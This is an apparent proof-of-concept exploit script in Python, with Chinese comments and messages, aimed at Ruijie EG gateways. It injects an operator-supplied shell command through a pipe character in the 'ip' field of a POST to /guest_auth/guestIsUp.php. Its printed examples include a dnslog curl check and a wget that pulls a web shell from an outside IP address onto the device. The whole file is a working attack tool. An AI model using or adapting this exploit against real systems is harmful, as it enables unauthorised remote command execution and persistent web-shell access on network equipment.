import requests
import optparse
print('''
 ____                 _____                       ____    ____      
/\  _`\           __ /\___ \  __                 /\  _`\ /\  _`\    
\ \ \L\ \  __  __/\_\\/__/\ \/\_\     __         \ \ \L\_\ \ \L\_\  
 \ \ ,  / /\ \/\ \/\ \  _\ \ \/\ \  /'__`\ _______\ \  _\L\ \ \L_L  
  \ \ \\ \\ \ \_\ \ \ \/\ \_\ \ \ \/\  __//\______\\ \ \L\ \ \ \/, \
  
   \ \_\ \_\ \____/\ \_\ \____/\ \_\ \____\/______/ \ \____/\ \____/
    \/_/\/ /\/___/  \/_/\/___/  \/_/\/____/          \/___/  \/___/ 
                                           by capOnKing
==================================================================''')
def cmdParam():
    global options,args,response,header
    try:
        parse=optparse.OptionParser(usage="%prog -u http://www.baidu.com\t ",version="v1.0")   #实例化命令行参数
        parse.add_option("-u","--url",dest="url",type=str,help="please input target url!",metavar="url")
        options,args=parse.parse_args()       
        print("[+]测试url: " + options.url)
    except Exception as e:
        print("[!]请使用-h参数查看帮助！")

def poc():
    url = options.url
    print("[+]以下为命令示例(无回显，经测试，bash反弹似乎有问题)：")
    print("=================\n1.curl http://eg.dnslog.cn\t\t\t#检测漏洞存在与否\n2.wget http://210.21.15.2/123.txt -O shell.php\t#上传shell后的路径:http://IP/guest_auth/shell.php\n=================")
    cmd = input("cmd>")
    headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded"
    }
    payloadPath = "/guest_auth/guestIsUp.php"
    datas = {"mac":"1","ip":"|" + cmd}
    payload = url + payloadPath
    print("[+]正在测试" + payload)
    r = requests.post(payload , headers=headers , timeout=2 , verify=False , data = datas)
    if r.status_code == 200:
        print("[+]网站存活，请自行查看回显。")
    else:
        print("[!]请检查网站路径是否正确，是否为锐捷网关。")    
def main():
    cmdParam()
    poc()

if "__main__" == __name__:
    main()